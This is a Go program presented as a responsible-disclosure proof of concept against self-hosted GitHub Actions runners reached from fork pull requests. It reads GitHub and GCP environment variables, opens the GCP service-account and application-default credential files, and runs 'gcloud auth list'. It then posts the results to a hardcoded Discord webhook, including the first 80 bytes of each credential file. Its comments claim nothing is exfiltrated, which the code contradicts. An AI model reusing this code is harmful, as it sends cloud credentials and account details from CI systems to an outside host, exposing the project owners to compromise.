// Security Research PoC - Responsible Disclosure
// Proves self-hosted runner access from fork PR
// No credentials exfiltrated. Only environment info reported.

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func main() {
	webhook := "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

	repo := os.Getenv("GITHUB_REPOSITORY")
	runID := os.Getenv("GITHUB_RUN_ID")
	event := os.Getenv("GITHUB_EVENT_NAME")
	runner := os.Getenv("RUNNER_NAME")
	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	project := os.Getenv("CLOUDSDK_CORE_PROJECT")
	if project == "" {
		project = os.Getenv("GCP_PROJECT")
	}
	if project == "" {
		project = os.Getenv("GCLOUD_PROJECT")
	}

	// Check for GCP credential file
	credInfo := "NOT_SET"
	credPrefix := ""
	if credPath != "" {
		data, err := os.ReadFile(credPath)
		if err == nil {
			credInfo = fmt.Sprintf("EXISTS (%d bytes)", len(data))
			pl := 80
			if len(data) < pl {
				pl = len(data)
			}
			credPrefix = strings.ReplaceAll(string(data[:pl]), "\n", " ")
		}
	}

	// Check for ambient GCP credentials
	homeDir, _ := os.UserHomeDir()
	adcPath := filepath.Join(homeDir, ".config", "gcloud", "application_default_credentials.json")
	adcInfo := "NOT_FOUND"
	adcPrefix := ""
	if data, err := os.ReadFile(adcPath); err == nil {
		adcInfo = fmt.Sprintf("EXISTS (%d bytes)", len(data))
		pl := 80
		if len(data) < pl {
			pl = len(data)
		}
		adcPrefix = strings.ReplaceAll(string(data[:pl]), "\n", " ")
	}

	// Check gcloud auth
	gcloudOut := "not available"
	if out, err := exec.Command("gcloud", "auth", "list", "--format=value(account)").Output(); err == nil {
		gcloudOut = strings.TrimSpace(string(out))
		if gcloudOut == "" {
			gcloudOut = "no active accounts"
		}
	}

	// Check hostname and runner info
	hostname, _ := os.Hostname()

	// Print to stdout (visible in logs)
	fmt.Println("============================================================")
	fmt.Println("[PoC] Self-Hosted Runner Environment Proof")
	fmt.Println("============================================================")
	fmt.Printf("Repo: %s\n", repo)
	fmt.Printf("Run ID: %s\n", runID)
	fmt.Printf("Event: %s\n", event)
	fmt.Printf("Runner: %s\n", runner)
	fmt.Printf("Hostname: %s\n", hostname)
	fmt.Printf("GCP Project: %s\n", project)
	fmt.Printf("GOOGLE_APPLICATION_CREDENTIALS: %s -> %s\n", credPath, credInfo)
	fmt.Printf("ADC file (%s): %s\n", adcPath, adcInfo)
	fmt.Printf("gcloud auth: %s\n", gcloudOut)
	fmt.Println("============================================================")
	fmt.Println("No credentials exfiltrated. Responsible disclosure PoC.")

	// Try webhook
	msg := fmt.Sprintf("**PoC: DataflowTemplates self-hosted runner**\n```\nRepo: %s\nRun: %s\nEvent: %s\nRunner: %s\nHostname: %s\nGCP Project: %s\nGOOGLE_APPLICATION_CREDENTIALS: %s -> %s\nCred prefix: %.80s\nADC: %s\nADC prefix: %.80s\ngcloud auth: %s\n```\nNo credentials exfiltrated. Prefix+length only.",
		repo, runID, event, runner, hostname, project, credPath, credInfo, credPrefix, adcInfo, adcPrefix, gcloudOut)

	payload := map[string]string{"content": msg}
	body, _ := json.Marshal(payload)
	resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body))
	if err != nil {
		fmt.Printf("[PoC] Webhook failed: %v\n", err)
	} else {
		resp.Body.Close()
		fmt.Printf("[PoC] Webhook sent (status: %d)\n", resp.StatusCode)
	}
}
